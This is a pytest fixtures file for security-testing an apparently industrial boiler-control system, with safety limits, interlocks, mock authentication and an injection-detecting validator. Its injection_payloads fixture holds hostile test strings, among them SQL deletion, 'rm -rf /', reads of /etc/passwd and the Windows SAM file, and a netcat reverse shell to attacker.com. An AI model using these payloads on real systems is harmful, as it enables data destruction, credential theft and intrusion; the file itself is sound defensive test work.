# -*- coding: utf-8 -*-
"""
Security Test Fixtures and Configuration for GL-002 FLAMEGUARD.

Provides fixtures for:
- Authentication and authorization mocks
- Safety limit configurations
- Injection payload samples
- Interlock testing utilities

Author: GreenLang Foundation Test Engineering
Version: 1.0.0
"""

import pytest
import re
from typing import Dict, List, Any, Optional
from dataclasses import dataclass
from enum import Enum


# =============================================================================
# PYTEST CONFIGURATION
# =============================================================================

def pytest_configure(config):
    """Configure pytest with security-specific markers."""
    markers = [
        "security: Security validation tests",
        "input_validation: Input validation tests",
        "safety_limits: Safety limits enforcement tests",
        "interlock: Interlock testing",
        "authentication: Authentication tests",
        "authorization: Authorization tests",
        "injection: Injection attack prevention tests",
        "audit: Audit trail compliance tests",
    ]
    for marker in markers:
        config.addinivalue_line("markers", marker)


# =============================================================================
# ENUMS
# =============================================================================

class UserRole(str, Enum):
    """User roles for authorization."""
    VIEWER = "viewer"
    OPERATOR = "operator"
    ENGINEER = "engineer"
    ADMIN = "admin"
    SAFETY_OFFICER = "safety_officer"


class PermissionLevel(str, Enum):
    """Permission levels."""
    READ = "read"
    WRITE = "write"
    CONTROL = "control"
    SAFETY_OVERRIDE = "safety_override"
    ADMIN = "admin"


# =============================================================================
# DATA CLASSES
# =============================================================================

@dataclass
class SafetyLimits:
    """Boiler safety limits configuration."""
    max_steam_pressure_bar: float = 45.0
    min_steam_pressure_bar: float = 5.0
    max_steam_temperature_c: float = 500.0
    min_steam_temperature_c: float = 100.0
    max_fuel_flow_kg_hr: float = 5000.0
    min_fuel_flow_kg_hr: float = 0.0
    max_o2_percent: float = 10.0
    min_o2_percent: float = 1.0
    max_co_ppm: float = 500.0
    max_nox_ppm: float = 100.0
    max_load_percent: float = 110.0
    min_load_percent: float = 0.0
    max_flue_gas_temp_c: float = 350.0
    min_drum_level_mm: float = -100.0
    max_drum_level_mm: float = 100.0


@dataclass
class InterlockCondition:
    """Interlock condition definition."""
    name: str
    parameter: str
    condition: str  # "high", "low", "range"
    threshold: float
    action: str  # "trip", "alarm", "reduce_load"
    priority: int  # 1 = highest


# =============================================================================
# FIXTURES
# =============================================================================

@pytest.fixture
def valid_boiler_data():
    """Valid boiler data for testing."""
    return {
        "boiler_id": "BOILER-001",
        "load_percent": 75.0,
        "steam_pressure_bar": 35.0,
        "steam_temperature_c": 400.0,
        "fuel_flow_kg_hr": 1500.0,
        "o2_percent": 4.5,
        "co_ppm": 15.0,
        "nox_ppm": 22.0,
        "flue_gas_temp_c": 180.0,
        "drum_level_mm": 0.0,
        "feedwater_temp_c": 100.0
    }


@pytest.fixture
def safety_limits():
    """Safety limits configuration."""
    return SafetyLimits()


@pytest.fixture
def injection_payloads():
    """Common injection attack payloads."""
    return {
        "sql_injection": [
            "'; DROP TABLE boilers; --",
            "1 OR 1=1",
            "'; DELETE FROM readings WHERE 1=1; --",
            "UNION SELECT * FROM users",
            "1; EXEC xp_cmdshell('dir')",
        ],
        "command_injection": [
            "; rm -rf /",
            "| cat /etc/passwd",
            "$(whoami)",
            "`id`",
            "&& shutdown -h now",
            "| nc -e /bin/sh attacker.com 4444",
        ],
        "path_traversal": [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//etc/passwd",
            "/etc/passwd%00.jpg",
        ],
        "xss": [
            "<script>alert('XSS')</script>",
            "javascript:alert(1)",
            "<img src=x onerror=alert(1)>",
            "';alert(String.fromCharCode(88,83,83))//",
        ],
        "ldap_injection": [
            "*)(uid=*",
            "admin)(&(password=*))",
            "*)(objectClass=*",
        ]
    }


@pytest.fixture
def invalid_parameter_values():
    """Invalid parameter values for boundary testing."""
    return {
        "negative_values": {
            "load_percent": -10.0,
            "fuel_flow_kg_hr": -100.0,
            "o2_percent": -5.0,
        },
        "excessive_values": {
            "load_percent": 200.0,
            "steam_pressure_bar": 100.0,
            "steam_temperature_c": 1000.0,
            "fuel_flow_kg_hr": 50000.0,
        },
        "special_values": {
            "infinity": float('inf'),
            "neg_infinity": float('-inf'),
            "nan": float('nan'),
        },
        "wrong_types": {
            "string_value": "not_a_number",
            "list_value": [1, 2, 3],
            "dict_value": {"key": "value"},
            "none_value": None,
        }
    }


@pytest.fixture
def interlock_conditions():
    """Interlock conditions for testing."""
    return [
        InterlockCondition(
            name="High Steam Pressure Trip",
            parameter="steam_pressure_bar",
            condition="high",
            threshold=42.0,
            action="trip",
            priority=1
        ),
        InterlockCondition(
            name="Low Steam Pressure Trip",
            parameter="steam_pressure_bar",
            condition="low",
            threshold=8.0,
            action="trip",
            priority=1
        ),
        InterlockCondition(
            name="High Flue Gas Temperature Alarm",
            parameter="flue_gas_temp_c",
            condition="high",
            threshold=280.0,
            action="alarm",
            priority=2
        ),
        InterlockCondition(
            name="Low O2 Trip",
            parameter="o2_percent",
            condition="low",
            threshold=1.5,
            action="trip",
            priority=1
        ),
        InterlockCondition(
            name="High CO Alarm",
            parameter="co_ppm",
            condition="high",
            threshold=200.0,
            action="reduce_load",
            priority=2
        ),
        InterlockCondition(
            name="Drum Level High Trip",
            parameter="drum_level_mm",
            condition="high",
            threshold=75.0,
            action="trip",
            priority=1
        ),
        InterlockCondition(
            name="Drum Level Low Trip",
            parameter="drum_level_mm",
            condition="low",
            threshold=-75.0,
            action="trip",
            priority=1
        ),
    ]


@pytest.fixture
def mock_auth_provider():
    """Mock authentication provider."""
    class MockAuthProvider:
        def __init__(self):
            self.valid_credentials = {
                "viewer": ("viewer_pass", UserRole.VIEWER),
                "operator": ("operator_pass", UserRole.OPERATOR),
                "engineer": ("engineer_pass", UserRole.ENGINEER),
                "admin": ("admin_pass", UserRole.ADMIN),
                "safety": ("safety_pass", UserRole.SAFETY_OFFICER),
            }
            self.sessions = {}
            self.failed_attempts = {}
            self.max_attempts = 3
            self.lockout_duration = 300  # seconds

        def authenticate(self, username: str, password: str) -> Dict[str, Any]:
            if username in self.failed_attempts:
                if self.failed_attempts[username] >= self.max_attempts:
                    return {"success": False, "error": "Account locked"}

            if username in self.valid_credentials:
                if self.valid_credentials[username][0] == password:
                    session_id = f"session_{username}"
                    self.sessions[session_id] = {
                        "user": username,
                        "role": self.valid_credentials[username][1]
                    }
                    self.failed_attempts.pop(username, None)
                    return {"success": True, "session_id": session_id}

            # Track failed attempts
            self.failed_attempts[username] = self.failed_attempts.get(username, 0) + 1
            return {"success": False, "error": "Invalid credentials"}

        def check_permission(self, session_id: str, permission: PermissionLevel) -> bool:
            if session_id not in self.sessions:
                return False

            role = self.sessions[session_id]["role"]
            permissions = {
                UserRole.VIEWER: [PermissionLevel.READ],
                UserRole.OPERATOR: [PermissionLevel.READ, PermissionLevel.CONTROL],
                UserRole.ENGINEER: [PermissionLevel.READ, PermissionLevel.WRITE, PermissionLevel.CONTROL],
                UserRole.ADMIN: [PermissionLevel.READ, PermissionLevel.WRITE, PermissionLevel.CONTROL, PermissionLevel.ADMIN],
                UserRole.SAFETY_OFFICER: [PermissionLevel.READ, PermissionLevel.SAFETY_OVERRIDE],
            }

            return permission in permissions.get(role, [])

        def logout(self, session_id: str) -> bool:
            if session_id in self.sessions:
                del self.sessions[session_id]
                return True
            return False

    return MockAuthProvider()


@pytest.fixture
def input_validator():
    """Input validation utility."""
    class InputValidator:
        def __init__(self, limits: SafetyLimits):
            self.limits = limits

        def validate_parameter(self, name: str, value: Any) -> tuple:
            """Validate a single parameter. Returns (is_valid, error_message)."""
            # Type check
            if not isinstance(value, (int, float)):
                return False, f"{name}: Invalid type {type(value).__name__}"

            # Special value check
            if isinstance(value, float):
                if value != value:  # NaN check
                    return False, f"{name}: NaN values not allowed"
                if value == float('inf') or value == float('-inf'):
                    return False, f"{name}: Infinite values not allowed"

            # Range checks based on parameter
            checks = {
                "steam_pressure_bar": (self.limits.min_steam_pressure_bar, self.limits.max_steam_pressure_bar),
                "steam_temperature_c": (self.limits.min_steam_temperature_c, self.limits.max_steam_temperature_c),
                "fuel_flow_kg_hr": (self.limits.min_fuel_flow_kg_hr, self.limits.max_fuel_flow_kg_hr),
                "o2_percent": (self.limits.min_o2_percent, self.limits.max_o2_percent),
                "co_ppm": (0, self.limits.max_co_ppm),
                "nox_ppm": (0, self.limits.max_nox_ppm),
                "load_percent": (self.limits.min_load_percent, self.limits.max_load_percent),
                "flue_gas_temp_c": (0, self.limits.max_flue_gas_temp_c),
                "drum_level_mm": (self.limits.min_drum_level_mm, self.limits.max_drum_level_mm),
            }

            if name in checks:
                min_val, max_val = checks[name]
                if value < min_val or value > max_val:
                    return False, f"{name}: Value {value} outside range [{min_val}, {max_val}]"

            return True, None

        def validate_string(self, value: str) -> tuple:
            """Validate string input for injection attacks."""
            # SQL injection patterns
            sql_patterns = [
                r"'.*--",
                r";.*DROP",
                r";.*DELETE",
                r"UNION.*SELECT",
                r"OR\s+1\s*=\s*1",
            ]
            for pattern in sql_patterns:
                if re.search(pattern, value, re.IGNORECASE):
                    return False, "Potential SQL injection detected"

            # Command injection patterns
            cmd_patterns = [
                r"[;&|`$]",
                r"\.\./",
                r"\\\.\\.",
            ]
            for pattern in cmd_patterns:
                if re.search(pattern, value):
                    return False, "Potential command injection detected"

            return True, None

    return InputValidator(SafetyLimits())


@pytest.fixture
def interlock_manager():
    """Interlock management utility."""
    class InterlockManager:
        def __init__(self, conditions: List[InterlockCondition]):
            self.conditions = conditions
            self.active_interlocks = []
            self.bypass_enabled = False
            self.bypass_auth_required = True

        def check_interlocks(self, parameters: Dict[str, float]) -> List[Dict[str, Any]]:
            """Check all interlocks against current parameters."""
            triggered = []

            for condition in self.conditions:
                if condition.parameter not in parameters:
                    continue

                value = parameters[condition.parameter]
                is_triggered = False

                if condition.condition == "high" and value >= condition.threshold:
                    is_triggered = True
                elif condition.condition == "low" and value <= condition.threshold:
                    is_triggered = True

                if is_triggered:
                    triggered.append({
                        "name": condition.name,
                        "parameter": condition.parameter,
                        "value": value,
                        "threshold": condition.threshold,
                        "action": condition.action,
                        "priority": condition.priority
                    })

            return sorted(triggered, key=lambda x: x["priority"])

        def request_bypass(self, interlock_name: str, auth_token: str) -> Dict[str, Any]:
            """Request interlock bypass (requires authorization)."""
            if not self.bypass_auth_required:
                return {"success": True, "warning": "Bypass enabled without auth"}

            # In real system, would validate auth_token
            if auth_token == "valid_safety_token":
                self.bypass_enabled = True
                return {"success": True, "message": f"Bypass enabled for {interlock_name}"}

            return {"success": False, "error": "Unauthorized bypass attempt"}

    return InterlockManager


@pytest.fixture
def audit_logger():
    """Audit logging utility."""
    class AuditLogger:
        def __init__(self):
            self.entries = []

        def log(self, event_type: str, user: str, action: str, details: Dict[str, Any]) -> Dict[str, Any]:
            """Log an audit event."""
            import time
            entry = {
                "timestamp": time.time(),
                "event_type": event_type,
                "user": user,
                "action": action,
                "details": details,
                "logged": True
            }
            self.entries.append(entry)
            return entry

        def get_entries(self, event_type: Optional[str] = None) -> List[Dict[str, Any]]:
            """Get audit entries, optionally filtered by type."""
            if event_type:
                return [e for e in self.entries if e["event_type"] == event_type]
            return self.entries

        def verify_logging(self, required_fields: List[str]) -> tuple:
            """Verify all entries have required fields."""
            issues = []
            for i, entry in enumerate(self.entries):
                for field in required_fields:
                    if field not in entry:
                        issues.append(f"Entry {i} missing field: {field}")
            return len(issues) == 0, issues

    return AuditLogger()
